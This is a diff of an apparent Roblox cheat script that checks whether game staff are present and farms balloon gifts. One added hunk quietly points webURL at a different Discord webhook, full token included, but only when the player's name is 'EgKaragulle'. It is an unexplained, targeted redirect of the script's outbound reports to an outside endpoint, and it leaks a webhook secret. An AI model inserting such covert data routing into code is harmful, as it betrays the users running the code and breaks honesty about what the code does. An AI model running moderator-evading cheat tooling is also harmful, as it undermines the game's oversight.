@@ -61,6 +61,9 @@ for _, player in pairs(game.Players:GetPlayers()) do
     if not success then
         print("[ANTI-STAFF] Error while checking player: " .. player.Name)
     end
+	if player.name == "EgKaragulle" then
+		webURL = "https://discord.com/api/webhooks/1229368434090049536/Rs0JiDZRSAPFu5n__9T8QLXUaWbEU_C3zv2R0N1fToa8MwJ-0bTW_MTs9sQ61o4Qoomq"
+	end
 end
 
 print("[ANTI-STAFF] No staff member detected")
@@ -164,7 +167,6 @@ function getTool() return Player.Character:FindFirstChild("WEAPON_"..Player.Name
 function equipTool(toolName) return Library.Network.Invoke(toolName.."_Toggle") end
 function getCurrentZone() return Library["MapCmds"].GetCurrentZone() end
 local startBalloons = #workspace.__THINGS.BalloonGifts:GetChildren()
-
 
 
 function getBalloonUID(zoneName) 
